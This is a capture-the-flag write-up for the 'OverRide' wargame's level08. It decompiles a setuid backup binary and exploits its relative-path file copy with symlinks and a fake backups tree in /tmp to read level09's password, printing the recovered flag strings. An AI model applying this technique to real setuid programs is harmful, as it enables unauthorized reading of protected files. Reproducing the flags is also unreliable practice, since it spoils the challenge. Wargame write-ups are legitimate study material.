### Step 1: Decompile with Ghydra

- The source code is available in `source.c`


### Step 2: Code Analysis

- 2 functions are present :
    - A `log_wrapper` function that formats logs and writes to a filestream passed in parameters
    - The `main` that opens the log file in `./backups/.log` (r+w), then opens a path specified by `av[1]` in read mode, and finally opens the path that results from the concatenation of `./backups/` and `av[1]` to write the content of the previous file


### Step 3: Trying to Exploit

- We want the flag the opened and read then written in the backups folder

- We can test that by opening the current flag present in level08's home and confirm that it works that way

```
level08@OverRide:~$ ./level08 ".pass"
level08@OverRide:~$ ls -la backups/
total 8
drwxrwx---+ 1 level09 users    80 Nov 22 18:06 .
dr-xr-x---+ 1 level08 level08 100 Oct 19  2016 ..
-rwxrwx---+ 1 level09 users    66 Nov 22 18:08 .log
-r--r-----+ 1 level09 users    41 Nov 22 18:06 .pass
level08@OverRide:~$ cat backups/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

- We can then try to do the same thing with the flag present in level09's home. The binary should be able to open it with his suid

```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

The error shows that the flag was opened but the concatened path string contains an exeeding `/` character => We have to find a way to bypass to problems :
    - The concatened string must be a valid path to write the output
    - The path in `av[1]` must be a real path to the flag


### Step 4: Final Exploit


1) create symlink of the level08 binary to /tmp
`ln -s /home/users/level08/level08 /tmp/level08`

```
level08@OverRide:/tmp$ ls -la
total 0
drwxrwxrwt 4 root    root    120 Nov 23 08:49 .
drwxr-xr-x 1 root    root    220 Nov 23 08:31 ..
drwxrwxrwx 3 level08 level08 100 Nov 23 08:45 backups
drwxrwxr-x 3 level08 level08  60 Nov 23 08:33 home
lrwxrwxrwx 1 level08 level08  27 Nov 23 08:48 level08 -> /home/users/level08/level08
```


2) create a symlink for the /home folder to /tmp/home
`ln -s /home /tmp/home`

This is used to bypass the error created by the forced concatenation of `./backups/` + our path `/home/users/level09/.pass`
```
level08@OverRide:/tmp$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
This symlink will help to remove the `/` preceding `home` while preserving the path to the real flag

3) create a fake folder tree in /tmp/backup to mimic to the behaviour of the binary backup function
```
mkdir /tmp/backups /tmp/backups/home /tmp/backups/home/users /tmp/backups/home/users/level09
```
The path provided is a real path to write the backup result  

4) run level08 binary in /tmp
```
cd /tmp
./level08 home/users/level09/.pass
```
No error => the flag should be present in our `/tmp/backups/home/users/level09` folder  

5) cat the flag store in our fake backup directory
```
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```